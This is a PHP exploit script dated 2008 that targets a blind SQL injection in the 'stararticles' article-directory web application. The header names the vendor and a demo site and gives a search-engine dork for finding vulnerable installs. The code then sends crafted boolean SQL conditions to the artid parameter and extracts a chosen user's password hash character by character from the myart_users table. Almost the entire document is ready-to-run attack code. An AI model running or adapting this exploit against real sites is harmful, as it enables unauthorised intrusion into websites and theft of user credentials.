<?php
	/*         ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        +                                                                               +
        +            stararticles blind sql injection Vulnerability  xpl         +
        ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
AUTHOR : Mountassif Moad
DATE   : 26 nov 2008
#####################################################
APPLICATION   : stararticles
DOWNLOAD(175$): http://cmsnx.com/psf/order.php?id=5
VENDOR        : http://www.stararticles.com/
DEMO          : http://www.kalptarudemos.com/demo/stararticle/
DORK          : inurl:"article.download.php"
#####################################################
 */

#
ini_set("max_execution_time",0);
print_r('
###############################################################
#         stararticles Blind SQL Injection Exploit 
#php '.$argv[0].' "http://www.site.com/article.download.php?artid=36106" 1
#                                                         
###############################################################
');
if ($argc > 1) {
$url = $argv[1];
if ($argc < 3) {
$userid = 1;
} else {
$userid = $argv[2];
}
$r = strlen(file_get_contents($url."+and+1=1"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."+and+1=0"));
$t = abs((100-($w/$r*100)));
echo "\nPassword: ";
for ($j = 1; $j <= 32; $j++) {
   for ($i = 46; $i <= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+myart_users+where+id=".$userid."+limit+0,1),".$j.",1))%3E".$i.""));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+myart_users+where+id=".$userid."+limit+0,1),".$j.",1))%3E".($i-1).""));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
} else {
echo "\nExploiting failed: By Stack\n";
}
?>
